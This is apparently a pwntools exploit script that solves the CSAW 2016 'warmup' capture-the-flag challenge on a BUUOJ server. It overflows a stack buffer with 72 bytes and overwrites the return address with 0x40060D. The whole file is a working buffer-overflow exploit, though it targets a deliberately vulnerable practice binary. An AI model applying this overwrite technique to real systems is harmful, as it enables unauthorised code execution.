from pwn import *


def warmup_csaw_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/warmup_csaw_2016'):
    target = remote('node5.buuoj.cn', 25930)
    target_elf = ELF(file_name)

    func_plt = p64(0x40060D)

    payload = b'A' * 72
    # func_plt()
    payload += func_plt

    target.sendline(payload)

    print(target.recv())
    print(target.recvline())
    print(target.recvline())



if __name__ == '__main__':
    warmup_csaw_2016()
